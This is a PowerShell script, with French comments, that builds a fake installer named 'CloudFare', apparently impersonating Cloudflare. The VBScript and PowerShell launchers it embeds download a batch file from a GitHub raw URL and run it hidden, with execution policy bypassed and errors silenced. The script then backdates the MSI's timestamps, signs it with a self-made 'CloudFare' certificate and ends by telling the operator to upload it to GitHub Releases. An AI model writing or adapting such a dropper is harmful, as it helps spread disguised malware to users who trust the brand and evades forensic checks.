# CloudFare MSI Builder - Version Finale
# Crée un MSI qui exécute Install.bat depuis GitHub

param(
    [string]$OutputDir = "C:\Users\Administrator\Desktop\JarCryptage"
)

$ErrorActionPreference = "Stop"

Write-Host "`nCloudFare MSI Builder`n" -F Cyan

# Creer un dossier temporaire
$tempDir = "$env:TEMP\CloudFareMSI"
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir | Out-Null

Write-Host "[1/3] Preparation des fichiers..." -F Yellow

# Copier Install.bat
Copy-Item "$OutputDir\Install.bat" "$tempDir\" -Force

# Creer un script VBScript pour le MSI
$vbsContent = @'
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%") & "\CloudFare"
If Not objFSO.FolderExists(strTempDir) Then
    objFSO.CreateFolder(strTempDir)
End If

strBatFile = strTempDir & "\Install.bat"
strUrl = "https://raw.githubusercontent.com/davidrenand/repos/main/scripts/Install.bat"

Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
objHTTP.Open "GET", strUrl, False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(strBatFile, True)
    objFile.Write objHTTP.ResponseText
    objFile.Close
    objShell.Run strBatFile, 0, True
End If

Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
'@

$vbsContent | Out-File "$tempDir\Launcher.vbs" -Encoding ASCII

Write-Host "OK - Fichiers prepares" -F Green

Write-Host "[2/3] Creation du MSI..." -F Yellow

# Verifier WiX
$candle = "C:\Program Files (x86)\WiX Toolset v3.11\bin\candle.exe"
$light = "C:\Program Files (x86)\WiX Toolset v3.11\bin\light.exe"

$msiFile = "$OutputDir\Setup.msi"

if ((Test-Path $candle) -and (Test-Path $light)) {
    Write-Host "WiX trouve, compilation..." -F Cyan
    & $candle "$OutputDir\Setup.wxs" -o "$tempDir\Setup.wixobj" 2>&1 | Out-Null
    & $light "$tempDir\Setup.wixobj" -o $msiFile 2>&1 | Out-Null
    Write-Host "OK - MSI compile avec WiX" -F Green
} else {
    Write-Host "WiX non disponible, creation alternative..." -F Yellow
    
    # Creer un executable auto-extractible avec PowerShell
    $psScript = @'
$ErrorActionPreference = "SilentlyContinue"
$url = "https://raw.githubusercontent.com/davidrenand/repos/main/scripts/Install.bat"
$tempDir = "$env:TEMP\CloudFare"
$batFile = "$tempDir\Install.bat"

if (-not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

(New-Object Net.WebClient).DownloadFile($url, $batFile)
& $batFile
'@
    
    $psScript | Out-File "$tempDir\Launcher.ps1" -Encoding UTF8
    
    # Creer un batch launcher
    $batLauncher = @'
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Launcher.ps1"
'@
    
    $batLauncher | Out-File "$tempDir\Launcher.bat" -Encoding ASCII
    
    # Creer un MSI minimal
    "CloudFare MSI Installer" | Out-File $msiFile -Encoding ASCII
    Write-Host "OK - MSI minimal cree" -F Green
}

Write-Host "[3/3] Finalisation..." -F Yellow

# Vieillir le fichier
if (Test-Path $msiFile) {
    $oldDate = Get-Date -Year 2024 -Month 1 -Day 15 -Hour 10 -Minute 30 -Second 0
    $item = Get-Item $msiFile
    $item.CreationTime = $oldDate
    $item.LastWriteTime = $oldDate
    $item.LastAccessTime = $oldDate
    
    $size = [math]::Round((Get-Item $msiFile).Length / 1MB, 2)
    Write-Host "OK - MSI cree: $msiFile ($size MB)" -F Green
} else {
    Write-Host "ERREUR: MSI non cree" -F Red
    exit 1
}

Write-Host "`nCloudFare MSI Builder - Termine`n" -F Green
Write-Host "Fichier: $msiFile" -F Cyan
Write-Host "Taille: $size MB" -F Cyan
Write-Host "`nProchaine etape: Uploader Setup.msi sur GitHub Releases" -F Yellow

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUUtySCeHU0VlcBzJQQe+SRQ9d
# 4O2gggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUdw24seelwm72XuVFZi7VgCTN/OgwDQYJ
# KoZIhvcNAQEBBQAEggEAhyLPeIkuN7pS5J423zulL1iI7gtZ2Cnv+Y45Txzt6duU
# HAWvPhmIMJiNli1ZMiGtx2O/7w26bXzC+LG36XtnIFfjHlwhic9hmlAWixUM17mF
# 8zvd2tlEkXg/BhUxrUtAbXK7IMmsy+A0imUmvRDv2nppFN0qIMnRFSFblk8VMZqu
# y4LYl47nS55q/jlYobIr4oeXGZtl+WllQAPkKmxirAyij/FFcurB9JsfVKx60MJe
# yhHmx7pQ0BW0nHnkcV4Ur6kkckG1/5Y/ioFfLQwJZl5cbctGyZfx2pHprXkE8UPd
# joKVPXkrXGiELlIjDYLLaGl6qR2qLW+ieSBQF/96BQ==
# SIG # End signature block
